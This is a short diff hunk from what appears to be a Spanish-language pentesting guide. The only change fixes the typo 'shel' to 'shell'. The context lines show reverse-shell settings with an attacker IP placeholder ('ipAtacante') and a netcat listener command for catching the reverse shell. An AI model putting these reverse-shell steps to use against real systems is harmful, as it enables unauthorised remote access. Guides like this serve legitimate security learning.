@@ -178,7 +178,7 @@ Parámetros que hay que cambiar:
 $ip = 'ipAtacante';  // CHANGE THIS
 $port = puertoEscucha;       // CHANGE THIS
 ```
-Para tomar la shel reversa:
+Para tomar la shell reversa:
 ```
 nc -lnvp puertoEscucha
 ```
